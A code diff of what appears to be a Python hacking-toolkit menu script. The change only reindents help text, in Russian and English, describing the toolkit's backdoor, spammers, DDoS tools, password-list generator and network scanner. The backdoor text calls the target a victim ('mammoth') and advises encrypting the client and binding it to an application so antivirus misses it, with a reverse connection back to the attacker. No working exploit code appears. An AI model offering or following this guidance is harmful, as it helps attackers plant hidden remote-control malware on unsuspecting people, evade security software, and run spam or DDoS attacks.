@@ -288,29 +288,29 @@ my_backdoor.run() """)
 		DefSec4()
 	def Backdoor3():
 		text = ''' \033[33m
-		Рус-RU
-		И так я написал простенький бэкдор состоит он из:
-		1-Клиент для жертвы
-		2-Сервер для хакера
-		В папке USER-BD будут сохранены файлы backdoor
-		Чтоб антивирусы не палили бэкдор,соединение произходит самой жертвой,
-		то есть соединение будет происходить к серверу.
-		НО прежде чем использовать Клиент надо зашифровать и склеить с приложением
-		Что бы всё работало необходимо:когда клиент и сервер оба включены 
-		Когда всё прошло успешно вы можете управлять системой через терминал
-		P.s Учитывая какая ОС таким и команды нужно вводить
-		
-		Англ-Eng
-		And so I wrote a simple backdoor it consists of:
-		1-Client for the victim
-		2-Server for the hacker
-		Backdoor files will be saved in the USER-BD folder
-		So that antiviruses do not fire backdoor, the connection is made by the victim itself,
-		that is, the connection will occur to the server.
-		BUT before using the Client must be encrypted and glued with the application
-		For everything to work, it’s necessary: when the client and server are both turned on
-		When everything went well you can control the system through the terminal
-		P.s Given which OS and commands you need to enter	'''
+Рус-RU
+И так я написал простенький бэкдор состоит он из:
+1-Клиент для жертвы
+2-Сервер для хакера
+В папке USER-BD будут сохранены файлы backdoor
+Чтоб антивирусы не палили бэкдор,соединение произходит самой жертвой,
+то есть соединение будет происходить к серверу.
+НО прежде чем использовать Клиент надо зашифровать и склеить с приложением
+Что бы всё работало необходимо:когда клиент и сервер оба включены 
+Когда всё прошло успешно вы можете управлять системой через терминал
+P.s Учитывая какая ОС таким и команды нужно вводить
+
+Англ-Eng
+And so I wrote a simple backdoor it consists of:
+1-Client for the victim
+2-Server for the hacker
+Backdoor files will be saved in the USER-BD folder
+So that antiviruses do not fire backdoor, the connection is made by the victim itself,
+that is, the connection will occur to the server.
+BUT before using the Client must be encrypted and glued with the application
+For everything to work, it’s necessary: when the client and server are both turned on
+When everything went well you can control the system through the terminal
+P.s Given which OS and commands you need to enter	'''
 		print(text)
 		print('Перейти в главное меню?(Go to the main menu?)\n Да/Нет | Yes/No')
 		otv()
@@ -333,45 +333,45 @@ def DefSec99():
 	clean()
 	texta = """
 	\033[33m
-	Рус-RU
-	Информация о программах:
-	1)DSpamers - DefineSpamers 
-	  Перевод:Определить спамер
-	  на данный момент есть 3 версии спамеров
-	2)D-DDos - DefineDDos 
-	  Перевод: Определить ДДосер
-	  на данный момент есть 3 разных ддосреа
-	3)PassGen - Password Generation
-	  Перевод: Генерация пароля
-	  Оно генерирует пароли по ключевым словам,
-	  чем больше слов тем обширнее список паролей.
-	  Список паролей сохраняется в txt формате
-	4)BackDoor - Черный вход 
-	  Нужен для удаленного контроля при помощи терминала.
-	  состоит из клиента который должен запустить мамонт(Жертва)
-	и сервера который должен запустить хакер 
-	5)SkanNet -Skaner Network
-	  Перевод:Сконирование сети
-	  Сканирует и отправляет пакеты на запрос МАК Адреса
-	  нужно быть в одной сети работает на Linux
-	  
-	Англ-Eng
-	Information about the programs:
-	1)DSpamers - DefineSpamers
-	  Сurrently there are 3 versions of spammers
-	2)D-DDos - DefineDDos 
-	  at the moment there are 3 different ddos
-	3)PassGen - Password Generation
-	  It generates passwords for keywords,
-	  the more words, the more extensive the password list.
-	  Password list saved in txt format
-	4)BackDoor 
-	  Required for remote control using the terminal.
-	  consists of a client who must launch a mammoth (victim)
-	  and the server on which the hacker should work
-	5)SkanNet -Skaner Network
-	  Scans and sends packets to request a MAC address
-	  must be on the same network (linux)"""
+Рус-RU
+Информация о программах:
+1)DSpamers - DefineSpamers 
+  Перевод:Определить спамер
+  на данный момент есть 3 версии спамеров
+2)D-DDos - DefineDDos 
+  Перевод: Определить ДДосер
+  на данный момент есть 3 разных ддосреа
+3)PassGen - Password Generation
+  Перевод: Генерация пароля
+  Оно генерирует пароли по ключевым словам,
+  чем больше слов тем обширнее список паролей.
+  Список паролей сохраняется в txt формате
+4)BackDoor - Черный вход 
+  Нужен для удаленного контроля при помощи терминала.
+  состоит из клиента который должен запустить мамонт(Жертва)
+и сервера который должен запустить хакер 
+5)SkanNet -Skaner Network
+  Перевод:Сконирование сети
+  Сканирует и отправляет пакеты на запрос МАК Адреса
+  нужно быть в одной сети работает на Linux
+
+Англ-Eng
+Information about the programs:
+1)DSpamers - DefineSpamers
+  Сurrently there are 3 versions of spammers
+2)D-DDos - DefineDDos 
+  at the moment there are 3 different ddos
+3)PassGen - Password Generation
+  It generates passwords for keywords,
+  the more words, the more extensive the password list.
+  Password list saved in txt format
+4)BackDoor 
+  Required for remote control using the terminal.
+  consists of a client who must launch a mammoth (victim)
+  and the server on which the hacker should work
+5)SkanNet -Skaner Network
+  Scans and sends packets to request a MAC address
+  must be on the same network (linux)"""
 	print(texta)
 	print('Перейти в главное меню?(Go to the main menu?)\n Да/Нет | Yes/No')
 	otv()
